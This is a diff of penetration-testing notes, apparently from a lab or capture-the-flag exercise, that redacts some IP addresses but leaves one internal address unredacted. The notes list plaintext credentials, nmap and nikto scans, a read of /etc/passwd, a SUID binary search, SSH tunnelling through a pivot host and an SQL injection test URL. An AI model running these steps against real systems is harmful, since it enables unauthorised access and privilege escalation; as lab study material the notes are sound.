@@ -1,20 +1,20 @@
-Starting IP Address : 10.50.46.1 -> 192.168.28.181
+Starting IP Address : 10.50.x.x -> 192.168.x.x
 Credz : user2||EaglesIsARE78  user3||Bob4THEEapples  Lee_Roth||anotherpassword4THEages  Aaron||apasswordyPa$$word  
 =======================================================================================================================
->> nmap -Pn -T4 --min-rate 654874654 10.50.46.1 -p20-22,2222,4444,4242,80,8080,3389
+>> nmap -Pn -T4 --min-rate 654874654 10.50.x.x -p20-22,2222,4444,4242,80,8080,3389
 -- Banner grab to identify the actual services
->> nmap -Pn -T4 --min-rate 156467896 10.50.46.1 -p80 --script http-enum-nse
+>> nmap -Pn -T4 --min-rate 156467896 10.50.x.x -p80 --script http-enum.nse
 -- sudo apt install nikto
->> nikto -h 10.50.46.1
+>> nikto -h 10.50.x.x
 >> firefox
 -- used recon to find initial access
 >> whoami && hostname
 >> cat /etc/host & passwd
 >> sudo -l
->> find / -type f -perm /4000 -ls 2>/dev/null
->> ssh user2@10.50.46.1 -D 9050 -NT
->> ssh user2@10.50.46.1 -L 51750:192.168.28.181:22 -NT
->> ssh user2@10.50.46.1 -L 51751:192.168.28.181:80 -NT
+>> find / -type f -perm /6000 -ls 2>/dev/null
+>> ssh user2@10.50.x.x -D 9050 -NT
+>> ssh user2@10.50.x.x -L 51750:192.168.x.x:22 -NT
+>> ssh user2@10.50.x.x -L 51751:192.168.x.x:80 -NT
 >> proxychains nmap -Pn -T4 --min-rate 654874654 192.168.28.181 -p20-22,2222,4444,4242,80,8080,3389
 >> proxychains nmap -Pn -T4 --min-rate 654874654 192.168.28.181 -p80 --script http-enum.nse
 -- testing SQL injection : http://127.0.0.1:51751/pick.php?product=7%20or%201=1;#
